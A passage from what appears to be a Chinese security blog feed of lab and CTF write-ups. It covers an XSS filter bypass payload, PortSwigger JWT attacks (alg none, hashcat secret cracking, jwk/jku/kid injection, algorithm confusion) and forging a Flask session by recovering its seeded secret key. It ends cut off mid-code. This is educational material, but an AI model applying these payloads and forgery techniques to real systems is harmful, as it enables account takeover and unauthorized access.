&lt;/script&gt;</span><br><span class="line">        &lt;title&gt;欢迎来到level16&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1 align=center&gt;欢迎来到level16&lt;/h1&gt;</span><br><span class="line">        &lt;?php </span><br><span class="line">            ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">            $str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">            $str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);</span><br><span class="line">            $str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);</span><br><span class="line">            $str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);</span><br><span class="line">            $str5=str_replace(&quot;&quot;,&quot;&amp;nbsp;&quot;,$str4);</span><br><span class="line">            echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;</span><br><span class="line">        ?&gt;</span><br><span class="line">        &lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;</span><br><span class="line">        &lt;?php </span><br><span class="line">            echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str5).&quot;&lt;/h3&gt;&quot;;</span><br><span class="line">        ?&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>过滤了空格，php绕过空格的方法很多，%0a，%0c都可以。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=&lt;img%0asrc=&#x27;1&#x27;%0aonerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><img src="/XSS/XSS-Lab/image-20250723101031461.png" class="" title="image-20250723101031461"><p>level14的鉴别网站已经不见了，所以没有做。</p><p>level17 ~ level20 都是flash的利用，flash已经退出了历史舞台，这几关就失去了意义。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>htmlspecialchars()函数，可以防御大多数XSS攻击，有XSS攻击的地方，基本上都是使用了自己写的过滤，过滤的不完全，导致出现XSS攻击。</p><p>注入点不仅可以是get或post注入，还可以通过cookie，referer，User-Agent注入。</p>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JWT 安全</title>
      <link href="/JWT-%E5%AE%89%E5%85%A8/JWT-%E5%AE%89%E5%85%A8/"/>
      <url>/JWT-%E5%AE%89%E5%85%A8/JWT-%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="接受任意签名"><a href="#接受任意签名" class="headerlink" title="接受任意签名"></a>接受任意签名</h2><h3 id="实验要求："><a href="#实验要求：" class="headerlink" title="实验要求："></a>实验要求：</h3><p>本实验室使用基于 JWT 的机制来处理会话。由于实现缺陷，服务器不会验证收到的任何 JWT 的签名。</p><p>要解决该实验，请修改您的会话令牌以访问<code>/admin</code>的管理面板，然后删除用户<code>carlos</code>。</p><p>您可以使用以下凭证登录您自己的帐户：<code>wiener:peter</code></p><h3 id="进行实验"><a href="#进行实验" class="headerlink" title="进行实验"></a>进行实验</h3><p>点击右上角的My account，用<code>wiener:peter</code>进行登录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie: session=eyJraWQiOiIwYzdiNWRmZi00NzcyLTQyMzctOTJlMy1jMTk4MTE5MjVkMjgiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1MjU1MzIwOCwic3ViIjoid2llbmVyIn0.EuFkMQ2v_UpDgAl94DsYivdF5aYGDjJaxGfrJ_00exSOO_C_YuXKK1UK6sWxCYygICnJOs-GAUypbLUwNA1eAzq5vu-RxYoiGLj_S3Z9nXL6YIPF2DHRCb3MBIRDqf6_7gQAy6aa3XxMaEVECKYMu13rxgFigo473cOXuBx_St1vARpwfT-wucoqonjkX7FAt49NK9KxqXlD_xZ77XEZInRSzZYq16Qc71igqLBp-J9FqijOCgfHH1ljVgjx1zOAOzHb2ziEZrcBVALCzhCQyF6aO0QSuLnAUTZOFZFUzG4Bh0sefh_NeQajQwcBCv_nU3qgl6ycBzDnp2BOgckhSg</span><br></pre></td></tr></table></figure><p><a href="https://jwt.io/">解析工具</a></p><img src="/JWT-%E5%AE%89%E5%85%A8/JWT-%E5%AE%89%E5%85%A8/image-20250715110355377.png" class="" title="image-20250715110355377"><p>payload的sub 是我们登录时的用户名，我们接着访问&#x2F;admin。</p><p>response: Admin interface only available if logged in as an administrator</p><p>告诉我们只有administrator才可以访问&#x2F;admin。</p><p>摘取中间的payload，base64解码，提取base64解码内容，更改sub为administrator，并进行base64加密，替换原有的payload部分。</p><img src="/JWT-%E5%AE%89%E5%85%A8/JWT-%E5%AE%89%E5%85%A8/image-20250715111306887.png" class="" title="image-20250715111306887"><img src="/JWT-%E5%AE%89%E5%85%A8/JWT-%E5%AE%89%E5%85%A8/image-20250715111406605.png" class="" title="image-20250715111406605"><p>利用我们构造好的JWT访问&#x2F;admin路由，删除<code>carlos</code>，就可以完成实验要求。</p><p>这个实验告诉我们：后端不能只解码jwt，也要进行验证。</p><h2 id="接收无签名的令牌"><a href="#接收无签名的令牌" class="headerlink" title="接收无签名的令牌"></a>接收无签名的令牌</h2><h3 id="实验要求：-1"><a href="#实验要求：-1" class="headerlink" title="实验要求："></a>实验要求：</h3><p>本实验使用基于 JWT 的机制来处理会话。服务器配置不安全，无法接受未签名的 JWT。</p><p>要解决该实验，请修改您的会话令牌以访问<code>/admin</code>的管理面板，然后删除用户<code>carlos</code>。</p><p>您可以使用以下凭证登录您自己的帐户：<code>wiener:peter</code></p><h3 id="进行实验-1"><a href="#进行实验-1" class="headerlink" title="进行实验"></a>进行实验</h3><p>使用实验给我们的账户登录右上角的My account。</p><p>再利用抓包工具进行抓包，获取jwt令牌，将其放在jwt解析工具里面解析：</p><img src="/JWT-%E5%AE%89%E5%85%A8/JWT-%E5%AE%89%E5%85%A8/image-20250716071958763.png" class="" title="image-20250716071958763"><p>sub的值是我们的用户名；接着访问admin路由：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Admin interface only available if logged in as an administrator</span><br></pre></td></tr></table></figure><p>告诉我们只有administrator才可以进行访问。</p><p>修改sub为administrator，将alg的算法修改为none，接着删除签名部分，<strong>要保留最后的点</strong>。</p><img src="/JWT-%E5%AE%89%E5%85%A8/JWT-%E5%AE%89%E5%85%A8/image-20250716072253796.png" class="" title="image-20250716072253796"><p>用此令牌进行访问，然后删除用户<code>carlos</code>，实验完成。</p><h2 id="暴力破解密钥"><a href="#暴力破解密钥" class="headerlink" title="暴力破解密钥"></a>暴力破解密钥</h2><h3 id="实验要求：-2"><a href="#实验要求：-2" class="headerlink" title="实验要求："></a>实验要求：</h3><p>本实验使用基于 JWT 的机制来处理会话。它使用一个非常弱的密钥来签名和验证令牌。使用一个包含<a href="https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list">常用密钥的字典</a>很容易进行暴力破解。</p><p>要破解这个实验，首先要暴力破解网站的密钥。获取密钥后，用它对修改后的会话令牌进行签名，该令牌将授予你访问<code>/admin</code>管理面板的权限，然后删除该用户<code>carlos</code>。</p><p>您可以使用以下凭证登录您自己的帐户：<code>wiener:peter</code></p><h3 id="进行实验-2"><a href="#进行实验-2" class="headerlink" title="进行实验"></a>进行实验</h3><p>通过实验要求给的账户登录右上角的My account。</p><p>获取jwt令牌，通过hashcat爆破secret：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">hash</span> -a 0 -m 16500 jwt key.list</span><br><span class="line"><span class="comment"># -a 0 表示攻击模式为字典攻击</span></span><br><span class="line"><span class="comment"># -m 16500 对应JWT(HS256/HS384/HS512)签名破解</span></span><br><span class="line"><span class="comment"># 16501 非对称RSA签名(通常不可破解)</span></span><br><span class="line"><span class="comment"># 如果多次运行该命令，则需要包含--show标志输出结果</span></span><br><span class="line"><span class="comment"># 输出结果为`jwt:secret`</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 16500 eyJraWQiOiI5YzUzMzAxNy01YmRhLTQxOTgtYjZlOC0yZmUxMzY3NDYzMWYiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1MjYzNDA1NCwic3ViIjoid2llbmVyIn0._b3_tdVPrKZ3HuvQTiM7nmrC3APiGDYW-gzoM5JYNeU ./jwt.secrets.list</span><br></pre></td></tr></table></figure><img src="/JWT-%E5%AE%89%E5%85%A8/JWT-%E5%AE%89%E5%85%A8/image-20250716094930421.png" class="" title="image-20250716094930421"><p>密钥为secret1。</p><p>在登录&#x2F;admin时发现要administrator才能登录。</p><p>伪造jwt:</p><img src="/JWT-%E5%AE%89%E5%85%A8/JWT-%E5%AE%89%E5%85%A8/image-20250716095333215.png" class="" title="image-20250716095333215"><p>通过我们伪造的jwt访问&#x2F;admin路由，删除<code>carlos</code>，完成实验。</p><h2 id="JWT标头参数注入"><a href="#JWT标头参数注入" class="headerlink" title="JWT标头参数注入"></a>JWT标头参数注入</h2><h3 id="jwk参数注入自动签名"><a href="#jwk参数注入自动签名" class="headerlink" title="jwk参数注入自动签名"></a>jwk参数注入自动签名</h3><h4 id="实验要求：-3"><a href="#实验要求：-3" class="headerlink" title="实验要求："></a>实验要求：</h4><p>本实验室使用基于 JWT 的机制来处理会话。服务器支持JWT 标头中的<code>jwk</code>参数。有时，该机制会将正确的验证密钥直接嵌入令牌中。然而，它无法检查所提供的密钥是否来自可信来源。</p><p>要解决该实验，请修改并签署一个 JWT，该 JWT 允许您访问<code>/admin</code>的管理面板，然后删除用户<code>carlos</code>。</p><p>您可以使用以下凭证登录您自己的帐户：<code>wiener:peter</code></p><h4 id="进行实验-3"><a href="#进行实验-3" class="headerlink" title="进行实验"></a>进行实验</h4><p>通过实验要求给的账户登录My account。</p><p>拿到jwt令牌。</p><p>接着通过burpsuite拓展的jwt editor生成一个RSA密钥。</p><p>解码我们所得到的jwt令牌，如下图：</p><img src="/JWT-%E5%AE%89%E5%85%A8/JWT-%E5%AE%89%E5%85%A8/image-20250718110619333.png" class="" title="image-20250718110619333"><p>修改kid为我们新生成的RSA密钥的kid，接着在header头添加jwk参数，由于需要administrator才能访问&#x2F;admin路由，所以修改sub参数，修改后如下图所示：</p><img src="/JWT-%E5%AE%89%E5%85%A8/JWT-%E5%AE%89%E5%85%A8/image-20250718111209625.png" class="" title="image-20250718111209625"><p>将我们生成的密钥放入其中进行加密，用我们生成的jwt令牌访问&#x2F;admin路由，然后删除实验要求的用户即可。</p><p>第二种方法就是通过burpsuite的两个插件联合使用攻克这道题。</p><h3 id="jku参数注入自动签名"><a href="#jku参数注入自动签名" class="headerlink" title="jku参数注入自动签名"></a>jku参数注入自动签名</h3><h4 id="实验要求：-4"><a href="#实验要求：-4" class="headerlink" title="实验要求："></a>实验要求：</h4><p>本实验使用基于 JWT 的机制来处理会话。服务器支持JWT 标头中的<code>jku</code>参数。但是，在获取密钥之前，服务器未能检查提供的 URL 是否属于受信任的域。</p><p>为了解决这个实验，伪造一个 JWT，使您可以访问<code>/admin</code>的管理面板，然后删除用户<code>carlos</code>。</p><p>您可以使用以下凭证登录您自己的帐户：<code>wiener:peter</code></p><h4 id="进行实验-4"><a href="#进行实验-4" class="headerlink" title="进行实验"></a>进行实验</h4><p>通过实验要求给的账户登录右上角的My account。</p><p>获取JWT令牌。点击Go to exploit server，并进入。</p><img src="/JWT-%E5%AE%89%E5%85%A8/JWT-%E5%AE%89%E5%85%A8/image-20250719092645213.png" class="" title="image-20250719092645213"><p>通过burpsuite 的 JWT editor生成RSA密钥。右键，点击public key as </p><p>JWK。构造keys，如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;keys&quot;</span> <span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;kty&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RSA&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;e&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AQAB&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;kid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5f0d7505-0d28-4604-8c9e-bb5c3449c94b&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;n&quot;</span><span class="punctuation">:</span> <span class="string">&quot;3Qx_OvEnUyskA05d6oFzOOdNxeKYxDrkJ1634n1jYcu-quOTLKEXutwtjle4S053A9u4OOEOFLKYU6Gj2HirOb0Rr_MoDgBLIE01qy9ylHWOUJh3erKnVduHDtH_e4h5ipbUcVy3OFhoHAfzosexMgdGAuIoM2q-vB0k34VjW12x6HHLXh0yLh4aPrp0xNdRxbEWTQStw0A0q5Kaja1SpV7bIGjnMshKHVs-z2JAX9liJlGRelhUL2W3kkOw1kMo7yuOWB4kOac40XmfHqrgyc1euCP3aPb1Vsf15_1i4jbl3-UL_bZ7rzlWRWbSgcvgtTneAldAqlaNiL3YdiThLw&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><img src="/JWT-%E5%AE%89%E5%85%A8/JWT-%E5%AE%89%E5%85%A8/image-20250719093210228.png" class="" title="image-20250719093210228"><p>将其复制到body，store储存起来。</p><p>更改header的kid为我们新生成的RSA密钥的kid，添加jku，更改payload的sub为administrator，因为只有administrator才有权访问&#x2F;admin路由。点击左下角的sign进行签名，Don’t modify header 勾选上，点击ok。</p><img src="/JWT-%E5%AE%89%E5%85%A8/JWT-%E5%AE%89%E5%85%A8/image-20250719093721586.png" class="" title="image-20250719093721586"><p>接着发包，我们就可以访问&#x2F;admin路由，然后删除carlos用户，实验就完成了。</p><h3 id="kid参数注入自动签名"><a href="#kid参数注入自动签名" class="headerlink" title="kid参数注入自动签名"></a>kid参数注入自动签名</h3><h4 id="实验要求：-5"><a href="#实验要求：-5" class="headerlink" title="实验要求："></a>实验要求：</h4><p>本实验使用基于 JWT 的机制来处理会话。为了验证签名，服务器使用JWT 头中的<code>kid</code>参数从其文件系统中获取相关密钥。</p><p>为了解决这个实验，伪造一个 JWT，使您可以访问<code>/admin</code>的管理面板，然后删除用户<code>carlos</code>。</p><p>您可以使用以下凭证登录您自己的帐户：<code>wiener:peter</code></p><h4 id="进行实验-5"><a href="#进行实验-5" class="headerlink" title="进行实验"></a>进行实验</h4><p>通过实验要求给的账户登录右上角的<code>My account</code>。</p><p>开启代理，将my-account?id&#x3D;wiener发送到<code>burpsuite</code>。</p><p>通过拓展jwt editor生成对称密钥，并将k改为<code>AA==</code>：</p><img src="/JWT-%E5%AE%89%E5%85%A8/JWT-%E5%AE%89%E5%85%A8/image-20250719105613087.png" class="" title="image-20250719105613087"><p>接着将包发到repeater，修改kid为<code>../../../../../../dev/null</code>，由于只有administrator才有权限访问&#x2F;admin路由，所以更改sub为administrator。</p><img src="/JWT-%E5%AE%89%E5%85%A8/JWT-%E5%AE%89%E5%85%A8/image-20250719105812573.png" class="" title="image-20250719105812573"><p>点击左下角的sign，选择我们生成的对称密钥，勾选Don’t modify header，点击ok。接着通过send发包，并删除用户carlos即可。</p><h2 id="算法混淆攻击"><a href="#算法混淆攻击" class="headerlink" title="算法混淆攻击"></a>算法混淆攻击</h2><h3 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求:"></a>实验要求:</h3><p>本实验室使用基于 JWT 的机制来处理会话。它使用健壮的 RSA 密钥对来签名和验证令牌。然而，由于实现缺陷，该机制容易受到算法混淆攻击。</p><p>要解决此实验问题，首先需要获取服务器的公钥。该公钥通过标准端点公开。使用此密钥对修改后的会话令牌进行签名，该令牌将授予您访问<code>/admin</code>的管理面板的权限，然后删除该用户<code>carlos</code>。</p><p>您可以使用以下凭证登录您自己的帐户：<code>wiener:peter</code></p><h3 id="进行实验-6"><a href="#进行实验-6" class="headerlink" title="进行实验"></a>进行实验</h3><p>根据实验要求给的账户登录右上角的my account。</p><p>将包发到burpsuite。</p><p>访问&#x2F;jwks.json得到密钥。</p><img src="/JWT-%E5%AE%89%E5%85%A8/JWT-%E5%AE%89%E5%85%A8/image-20250721134645708.png" class="" title="image-20250721134645708"><p>进入jwt editor里面，新键一个RSA密钥，将此密钥复制进去，保存。</p><p>由于我点了一下PEM，所以成了下面这样。</p><img src="/JWT-%E5%AE%89%E5%85%A8/JWT-%E5%AE%89%E5%85%A8/image-20250721134838149.png" class="" title="image-20250721134838149"><p>点击：</p><img src="/JWT-%E5%AE%89%E5%85%A8/JWT-%E5%AE%89%E5%85%A8/image-20250721135007161.png" class="" title="image-20250721135007161"><p>进入Decoder，进行base64编码，接着新建一个HS256对称密钥，将base64编码后的内容放入k键中，保存。</p><img src="/JWT-%E5%AE%89%E5%85%A8/JWT-%E5%AE%89%E5%85%A8/image-20250721135130836.png" class="" title="image-20250721135130836"><p>接着进入repeater里面，修改alg为HS256，sub为administrator，点击sign进行签名，其他默认情况就可以：</p><img src="/JWT-%E5%AE%89%E5%85%A8/JWT-%E5%AE%89%E5%85%A8/image-20250721135414134.png" class="" title="image-20250721135414134"><p>点击send进行发包，然后删除carlos即可。</p><h2 id="无法获取公钥key"><a href="#无法获取公钥key" class="headerlink" title="无法获取公钥key"></a>无法获取公钥key</h2><h3 id="实验要求：-6"><a href="#实验要求：-6" class="headerlink" title="实验要求："></a>实验要求：</h3><p>本实验室使用基于 JWT 的机制来处理会话。它使用健壮的 RSA 密钥对来签名和验证令牌。然而，由于实现缺陷，该机制容易受到算法混淆攻击。</p><p>要解决此实验问题，首先需要获取服务器的公钥。使用此密钥对修改后的会话令牌进行签名，该令牌将授予您访问<code>/admin</code>的管理面板的权限，然后删除该用户<code>carlos</code>。</p><p>您可以使用以下凭证登录您自己的帐户：<code>wiener:peter</code></p><h3 id="进行实验-7"><a href="#进行实验-7" class="headerlink" title="进行实验"></a>进行实验</h3><p>通过实验要求给的账户登录：my account。</p><p>获取jwt令牌1，接着注销，接着登录，获取jwt令牌2。</p><p>运行此命令，第一次运行，会下载镜像：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --rm -it portswigger/sig2n eyJraWQiOiI1MWI4ZGI1MC1jOWYyLTRmNGYtYjkwMC0zMjQ1ZTYyN2ViYjMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1MzA4MTYwOSwic3ViIjoid2llbmVyIn0.oKbxZwDo8-v9_KrjWGYOaNao6VsCqPucwr6w9IVCVRe8uNuxWoR8o39KOZNw-a44IPTW84U6NHbp1TWuyIyEREvRGRJDLzoQHJyhBWPjNUV_1xnf__KPTPgWVJa2fhNvI10mkrgfIqJMq4adotraODXxfgbX1ReW6B640dzpJ3Xi0kNV4OT4pxvAVHUn7hrrhC1sm1tBSZa2VIv_rxqFK6DOalCqLIi0ffeKVhX5Gj7k23TIXWx5COmNiXVHyIlP5-vZA1WSIbfZdyOIf6mmo7Ds_xNRyafYc5nUHhR94l-Xrdl-fdTYoP5_M93Szko_hWi66arAqeS3NrE3nX-IDw eyJraWQiOiI1MWI4ZGI1MC1jOWYyLTRmNGYtYjkwMC0zMjQ1ZTYyN2ViYjMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1MzA4MTc3MCwic3ViIjoid2llbmVyIn0.HPp6Q90QBkSP_UmXuuu2NtS8n3jh8e1uPEEfEF8xrU5EyPzLBWf2XFkBAtGXX2if7X0d1RI_cQfI4-iKAYFVV2RjZ9TFX2KbAyaCrYOEoBa-TjMLE3EOKaKb7TtQsdBYb9aoThtOw3DNBPs3XUce09R8BQvdpNV1nZNtcqbkAaH7t_tI5piM1WSavxBTnybDOoiHPRFKimicmc2DI0jUY-ROP3h7SbnUrPQAQD9mDSJqVeR-NcnUm7D75rYs1AqJFSKm1nrIqocXJKx2gt79WDdC5WVT0qExPxC8m4WL68OgcEiJ09pERH3wqwuk6O0QEEbHi5ew-Jq7ol3gyRwmlA</span><br></pre></td></tr></table></figure><p>输出：</p><img src="/JWT-%E5%AE%89%E5%85%A8/JWT-%E5%AE%89%E5%85%A8/image-20250721144540696.png" class="" title="image-20250721144540696"><p>在&#x2F;myaccount?username&#x3D;winner路由，将终端工具输出的jwt更换到cookie中，如果状态码为200，则密钥是正确的，如果状态码为302，则换其他的。</p><p>第一个伪造的JWT是正确的，我们新建一个对称公钥，将key放入其中：</p><img src="/JWT-%E5%AE%89%E5%85%A8/JWT-%E5%AE%89%E5%85%A8/image-20250721145004734.png" class="" title="image-20250721145004734"><p>保存，进入repeater，并修改sub为administrator，alg为HS256，点击sign进行签名，发包，删除用户carlos即可。</p>]]></content>
      
      
      <categories>
          
          <category> JWT 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JWT 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>session 伪造</title>
      <link href="/session%E4%BC%AA%E9%80%A0/session-%E4%BC%AA%E9%80%A0/"/>
      <url>/session%E4%BC%AA%E9%80%A0/session-%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="CISCN2019-华东南赛区-Web4"><a href="#CISCN2019-华东南赛区-Web4" class="headerlink" title="[CISCN2019 华东南赛区]Web4"></a>[CISCN2019 华东南赛区]Web4</h2><img src="/session%E4%BC%AA%E9%80%A0/session-%E4%BC%AA%E9%80%A0/image-20250714100510425.png" class="" title="image-20250714100510425"><p>任意文件读，读取&#x2F;app&#x2F;app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re, random, uuid, urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode()) </span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;www-data&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack&#x27;</span></span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">str</span>(ex)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;fuck&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag.txt&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access denied&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">True</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p><code>random.random()在0-1之间，random.seed()设置随机数种子，此环境为python2，uuid.getnode获取网卡的MAC地址，linux的地址在/sys/class/net/eth0/address</code></p><p>可以通过&#x2F;read路由获得&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address的值。</p><img src="/session%E4%BC%AA%E9%80%A0/session-%E4%BC%AA%E9%80%A0/image-20250714101416864.png" class="" title="image-20250714101416864"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">a = <span class="string">&#x27;ca:79:65:d7:ae:ba&#x27;</span></span><br><span class="line">a = a.replace(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">random.seed(<span class="built_in">int</span>(a,<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(random.random()*<span class="number">233</span>))</span><br></pre></td></tr></table></figure><p>环境为python2，那就用python2运行。</p><p>密钥为：79.2721329801</p><img src="/session%E4%BC%AA%E9%80%A0/session-%E4%BC%AA%E9%80%A0/image-20250714101638286.png" class="" title="image-20250714101638286"><img src="/session%E4%BC%AA%E9%80%A0/session-%E4%BC%AA%E9%80%A0/image-20250714101655940.png" class="" title="image-20250714101655940"><p>反思：在进行代码审计的时候一定要认真的理清代码逻辑，不知道的代码，查就可以；收集信息的时候，明知道是python2环境，用python3去运行代码获得secret是很蠢的一个行为。</p>]]></content>
      
      
      <categories>
          
          <category> session伪造 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> session伪造 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF 2023 &amp; 0X401七月暑期挑战赛</title>
      <link href="/CTFwp/DASCTF-2023-0X401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/"/>
      <url>/CTFwp/DASCTF-2023-0X401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="EzFlask"><a href="#EzFlask" class="headerlink" title="EzFlask"></a>EzFlask</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 